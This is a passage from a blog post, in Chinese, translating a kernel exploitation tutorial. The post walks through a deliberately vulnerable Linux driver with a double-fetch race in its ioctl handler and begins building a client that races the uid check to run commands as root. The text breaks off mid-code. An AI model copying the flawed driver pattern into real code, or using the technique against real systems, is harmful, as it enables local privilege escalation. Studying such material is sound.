<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>An introduction to Kernel Exploitation Part 1 | f23y&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="原文链接：https:&#x2F;&#x2F;pwning.systems&#x2F;posts&#x2F;an-introduction-to-kernel-exploitation-part1&#x2F; 预备知识 Linux命令行的知识 了解如何读写基础C语言 能够在虚拟计算机或其他系统的帮助下进行调试 能够安装要求编译的内核模块 基本理解userland和kernelland的区别 基本理解汇编语言">
<meta property="og:type" content="article">
<meta property="og:title" content="An introduction to Kernel Exploitation Part 1">
<meta property="og:url" content="https://f23y.github.io/2021/11/10/An%20introduction%20to%20Kernel%20Exploitation%20Part%201/index.html">
<meta property="og:site_name" content="f23y&#39;s blog">
<meta property="og:description" content="原文链接：https:&#x2F;&#x2F;pwning.systems&#x2F;posts&#x2F;an-introduction-to-kernel-exploitation-part1&#x2F; 预备知识 Linux命令行的知识 了解如何读写基础C语言 能够在虚拟计算机或其他系统的帮助下进行调试 能够安装要求编译的内核模块 基本理解userland和kernelland的区别 基本理解汇编语言">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-11-10T08:09:03.456Z">
<meta property="article:modified_time" content="2021-05-02T13:36:40.228Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="f23y's blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">f23y&#39;s blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://f23y.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-An introduction to Kernel Exploitation Part 1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/11/10/An%20introduction%20to%20Kernel%20Exploitation%20Part%201/" class="article-date">
  <time class="dt-published" datetime="2021-11-10T08:09:03.456Z" itemprop="datePublished">2021-11-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      An introduction to Kernel Exploitation Part 1
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>原文链接：<a target="_blank" rel="noopener" href="https://pwning.systems/posts/an-introduction-to-kernel-exploitation-part1/">https://pwning.systems/posts/an-introduction-to-kernel-exploitation-part1/</a></p>
<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><ul>
<li>Linux命令行的知识</li>
<li>了解如何读写基础C语言</li>
<li>能够在虚拟计算机或其他系统的帮助下进行调试</li>
<li>能够安装要求编译的内核模块</li>
<li>基本理解userland和kernelland的区别</li>
<li>基本理解汇编语言</li>
</ul>
<span id="more"></span>

<p>这部分我写了个简单的 <a target="_blank" rel="noopener" href="https://github.com/JordyZomer/kernel_challenges/blob/main/episode1/driver">Linux character device</a>, <code>/dev/shell</code>. 这个驱动程序有两个实参 <code>uid</code> 和<code>cmd</code>, 它会执行 <code>cmd</code> 命令作为特定 <code>uid</code>. 要理解这个驱动程序如何工作，我会解释一些东西！</p>
<p>在Linux中注册设备时，它需要几个参数，其中最重要的是<em>fops</em>（文件操作）。字符设备的<em>fops</em>看起来像这样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">query_fops</span> =</span> &#123;</span><br><span class="line">		.owner = THIS_MODULE,</span><br><span class="line">		.open = shell_open,</span><br><span class="line">		.release = shell_close,</span><br><span class="line">		.unlocked_ioctl = shell_ioctl</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>您会看到有一些操作。<code>open</code>是在打开设备时调用的函数，<code>release</code>函数是在关闭设备时调用的函数， <code>unlocked_ioctl</code> 函数是在你向设备发出IOCTL（输入/输出控制）请求时调用的函数。在userland中这些看上去是这样的：</p>
<p>Open:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/dev/shell&quot;</span>, O_RDWR);</span><br></pre></td></tr></table></figure>

<p>Close:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">close(fd);</span><br></pre></td></tr></table></figure>

<p>IOCTL:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioctl(fd, COMMAND, argument);</span><br></pre></td></tr></table></figure>

<p>在这种情况下，我们将重点关注IOCTL请求。该请求带有一些参数：指向刚打开的设备的FD，命令编号，实参（它既可以是整数也可以是指向userland中数据结构的指针。</p>
<p>在我们的例子中，函数签名看起来像这样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">shell_ioctl</span><span class="params">(struct file *f, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br></pre></td></tr></table></figure>

<p>我们的IOCTL函数将指向userland中数据结构的指针作为实参。此参数是<code>struct user_data</code>，在我们的代码中描述为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">user_data</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>	uid;</span><br><span class="line">	<span class="keyword">char</span> cmd[<span class="number">100</span>];</span><br><span class="line">&#125; user_data;</span><br></pre></td></tr></table></figure>

<p>此结构包含一个用户ID和要执行的命令。这个命令的最大长度为100个字节。我们完整的ioctl句柄如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">shell_ioctl</span><span class="params">(struct file *f, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	user_data udat;</span><br><span class="line">	<span class="keyword">kuid_t</span> kernel_uid = current_uid();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(udat.cmd, <span class="number">0</span>, <span class="keyword">sizeof</span>(udat.cmd));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (raw_copy_from_user(&amp;udat.uid, (<span class="keyword">void</span> *)arg, <span class="keyword">sizeof</span>(udat.uid)))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;CHECKING VALIDITY OF UID: %d&quot;</span>, udat.uid);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (udat.uid == kernel_uid.val) &#123;</span><br><span class="line">		<span class="keyword">int</span> rc;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">sub_info</span>;</span></span><br><span class="line"></span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;UID: %d EQUALS %d&quot;</span>, udat.uid, kernel_uid.val);</span><br><span class="line"></span><br><span class="line">		usleep_range(<span class="number">1000000</span>, <span class="number">1000001</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *[<span class="number">4</span>]), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!argv)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memset</span>(&amp;udat, <span class="number">0</span>, <span class="keyword">sizeof</span>(udat));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (raw_copy_from_user(&amp;udat, (<span class="keyword">void</span> *)arg, <span class="keyword">sizeof</span>(udat)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">		real_uid = udat.uid;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">			<span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line">			<span class="string">&quot;TERM=linux&quot;</span>,</span><br><span class="line">			<span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,</span><br><span class="line">			<span class="literal">NULL</span></span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		argv[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">		argv[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">		argv[<span class="number">2</span>] = udat.cmd;</span><br><span class="line">		argv[<span class="number">3</span>] = <span class="literal">NULL</span>; </span><br><span class="line"></span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;CMD = %s\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">		sub_info = call_usermodehelper_setup(argv[<span class="number">0</span>], argv, envp, GFP_KERNEL, init_func, free_argv, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (sub_info == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			kfree(argv);</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		rc = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);</span><br><span class="line"></span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;RC = %d\n&quot;</span>, rc);</span><br><span class="line">		<span class="keyword">return</span> rc;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我解释一下。首先，它初始化一些数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Define our udat destination</span></span><br><span class="line">user_data udat;</span><br><span class="line"><span class="comment">// Get the current users UID</span></span><br><span class="line"><span class="keyword">kuid_t</span> kernel_uid = current_uid();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Zero out the structs CMD memory just to be sure.</span></span><br><span class="line"><span class="built_in">memset</span>(udat.cmd, <span class="number">0</span>, <span class="keyword">sizeof</span>(udat.cmd)); </span><br><span class="line">	 </span><br></pre></td></tr></table></figure>

<p>完成此操作后，我们将从用户空间获取一些数据，并将用户发送给我们的uid与我们获得的uid进行比较。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copy the uid part of the user_dat struct to kernel memory from userland.</span></span><br><span class="line"><span class="keyword">if</span> (raw_copy_from_user(&amp;udat.uid, (<span class="keyword">void</span> *)arg, <span class="keyword">sizeof</span>(udat.uid)))</span><br><span class="line">	 <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is the UID we supplied the same as the UID that calls this ioctl.</span></span><br><span class="line"><span class="keyword">if</span> (udat.uid == kernel_uid.val) &#123;</span><br><span class="line">	<span class="comment">// Next part</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在下一部分中，如果uid匹配，它将为下一步设置一些变量。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> rc;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">sub_info</span>;</span></span><br><span class="line"></span><br><span class="line">printk(KERN_INFO <span class="string">&quot;UID: %d EQUALS %d&quot;</span>, udat.uid, kernel_uid.val);</span><br><span class="line"></span><br><span class="line">usleep_range(<span class="number">1000000</span>, <span class="number">1000001</span>);</span><br><span class="line"><span class="keyword">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *[<span class="number">4</span>]), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!argv)</span><br><span class="line"> <span class="keyword">return</span> -ENOMEM;</span><br></pre></td></tr></table></figure>

<p>您可以在此处看到它为这个命令创建了缓冲区，一个返回代码和struct subprocess_info。以后会有用的。在那之后，它将进入休眠状态（使漏洞利用更加容易，因为我们专注于解释漏洞的目的，而不是疯狂的利用！）。之后，我们将为执行的命令的参数分配四个数组。如果无法分配内存，驱动程序将退出。</p>
<p>一旦这些数据结构被初始化，我们将对<code>udat</code>的内存进行清零，并从用户空间复制整个结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;udat, <span class="number">0</span>, <span class="keyword">sizeof</span>(udat));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (raw_copy_from_user(&amp;udat, (<span class="keyword">void</span> *)arg, <span class="keyword">sizeof</span>(udat)))</span><br><span class="line"> <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">real_uid = udat.uid;</span><br></pre></td></tr></table></figure>

<p>这是漏洞的来源！这里的漏洞是条件竞争，我们用一个花哨的词来称呼它：Double Fetch！</p>
<p>从理论上讲，一个Double Fetch漏洞是条件竞争的弱点。在内核态和用户态之间，可能存在数据访问竞争。在现代操作系统（例如Linux和BSD变体）中，虚拟内存地址通常分为内核空间和用户空间。</p>
<p>核心内核代码，驱动程序代码以及其他具有更高特权的组件在内核空间中运行。用户空间执行用户代码，通常通过系统/ IOCTL调用与内核交互以执行必要的任务。当用户空间将数据发送到内核时，内核通常使用复制函数（例如<code>copy_from_user()</code>用于验证和相关性）将数据复制到内核空间。</p>
<p>将内存从用户空间复制到内核空间的常用函数是：</p>
<ul>
<li>copy_from_user（Linux）</li>
<li>__copy_from_user（Linux）</li>
<li>get_user（Linux）</li>
<li>copyin（BSD）</li>
<li>copyinstr（BSD）</li>
<li>Many many more!</li>
</ul>
<p>我们可以通过一些从用户空间复制内存的函数来在首次获取数据后修改数据，这是此缺陷的危险之处。我们可能会避开对此数据可能进行的任何检查。在某些情况下有大小限制，但是在这种情况下，我们需要在对uid进行验证后对其进行调整。</p>
<p>从理论上讲，这将是Shell模块的易受攻击的代码路径。</p>
<ul>
<li>用户空间uid由模块检索</li>
<li>模块确定指定的uid是否与调用用户的uid相同。</li>
<li>在我们自己的用户空间内存中，我们不断在新线程中更改uid。</li>
<li>该模块以我们刚刚对其进行更改的用户的身份运行命令（使用<code>call_usermodehelper()</code>）。</li>
</ul>
<blockquote>
<p><strong>有趣的事实</strong>：这些<code>call_usermodehelper()</code>功能对于安全研究人员非常有用！它通常被用于rootkits或exp中，以返回userland并以提升的特权执行命令。</p>
</blockquote>
<p><strong>你的任务？为位于以下位置的驱动程序编写漏洞利用程序：</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/JordyZomer/kernel_challenges/blob/main/episode1/driver">https://github.com/JordyZomer/kernel_challenges/blob/main/episode1/driver</a></p>
<p>（在episode1/client中参考我的exp）。</p>
<h2 id="剧透警告（讨论我的exp）："><a href="#剧透警告（讨论我的exp）：" class="headerlink" title="剧透警告（讨论我的exp）："></a>剧透警告（讨论我的exp）：</h2><p>我们找到了驱动程序！让我们看看能否可以为它写出一个exp。我们将从构建设备开始，以便可以从我们的客户端访问它。</p>
<p>以root用户身份在<code>episode1/driver/</code>目录中运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make <span class="comment"># This will compile the kernel module and give you the shell.ko file</span></span></span><br><span class="line">...</span><br><span class="line"><span class="meta">$</span><span class="bash"> insmod shell.ko <span class="comment"># This will insert (load) our freshly compiled module</span></span></span><br><span class="line">...</span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod 777 /dev/shell <span class="comment"># We want the character device to be accesible by any user</span></span></span><br></pre></td></tr></table></figure>

<p>现在我们的驱动程序已经全部设置好，让我们开始在客户端上工作吧！我们从一个基本框架开始，其中包括我们一切所需的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这不会做太多，但是一旦编译完成就返回成功。</p>
<p>第一步是打开我们的设备，我们可以使用<code>open</code>syscall进行操作。</p>
<p>该<code>open</code>系统调用接受两个参数：一个<code>pathname</code>和一些<code>flags</code>。我们使用我们的设备作为<code>pathname</code>，<code>read + write</code>作为<code>flags</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// O_RDWR stands for open it for both reading and writing.</span></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/shell&quot;</span>, O_RDWR);</span><br></pre></td></tr></table></figure>

<p>当然，一旦我们打开了字符设备，就必须再次关闭它！这就是<code>close</code>syscall会做的！</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/shell&quot;</span>, O_RDWR);</span><br><span class="line">	<span class="comment">//<span class="doctag">XXX:</span> DO SOMETHING USEFUL HERE</span></span><br><span class="line">	close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在由我们来做一些有用的事情了。我们知道我们的驱动程序有一个IOCTL句柄，该句柄忽略<code>cmd</code>，但是会接受一个指向<code>struct user_data</code>的指针作为参数！</p>
<p>首先，将<code>user_data</code>结构包含在客户端中并发送IOCTL请求！如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This defines the struct that we&#x27;ll give as an argument to our IOCTL request.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">user_data</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>	uid;</span><br><span class="line">	<span class="keyword">char</span>	cmd[<span class="number">100</span>];</span><br><span class="line">&#125;  user_data;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// This creates an instance of the user_data structure called &#x27;udat&#x27;.</span></span><br><span class="line">	user_data udat; </span><br><span class="line"></span><br><span class="line">	<span class="comment">// We&#x27;ll initialize the data of the structure here!</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// our uid is the uid of my current user.</span></span><br><span class="line">	udat.uid = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Copy the string echo &#x27;foo&#x27; &gt; /tmp/hacker to our command as a test.</span></span><br><span class="line">	<span class="built_in">strcpy</span>(udat.cmd, <span class="string">&quot;echo &#x27;foo&#x27; &gt; /tmp/hacker&quot;</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Open our driver</span></span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/shell&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Make our actual IOCTL request with the data we just initialized. </span></span><br><span class="line">	ioctl(fd, <span class="number">0</span>, &amp;udat);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Close our driver again</span></span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们的简单客户端已完成！这个事实上将以用户身份运行我们的命令！</p>
<p>注意，上面的示例不执行任何debug；如果您想要debug自行完成。</p>
<p>现在是对该漏洞的实际利用，这需要我们在与内核模块的uid验证的竞争中胜出。我们可以通过<code>uid</code>在另一个线程中修改我们的<code>pthread</code>库来做到这一点。</p>
<p>在pthread中，可以使用<code>pthread_t</code>数据类型声明线程。接下来，我们可以使用<code>pthread_create()</code>来开始一个新的过程。</p>
<blockquote>
<p><em>From the docs</em>：pthread_create（）函数在调用过程中启动一个新线程。<br>新线程通过调用start_routine（）开始执行。arg作为start_routine（）的唯一参数传递。</p>
</blockquote>
<p>让我们更新代码以启动线程！</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">user_data</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>	uid;</span><br><span class="line">	<span class="keyword">char</span>	cmd[<span class="number">100</span>];</span><br><span class="line">&#125;  user_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_uid_root</span><span class="params">(<span class="keyword">void</span> *struct_ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Add code to change the uid in our structure.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello from our thread!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Declare an instance of a thread</span></span><br><span class="line">	<span class="keyword">pthread_t</span> thread;</span><br><span class="line"></span><br><span class="line">	user_data udat;</span><br><span class="line"></span><br><span class="line">	udat.uid = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">strcpy</span>(udat.cmd, <span class="string">&quot;echo &#x27;foo&#x27; &gt; /tmp/hacker&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Create a thread within our process that calls the change_uid_root() function</span></span><br><span class="line">	<span class="comment">// With our udat (user_data) structure as an 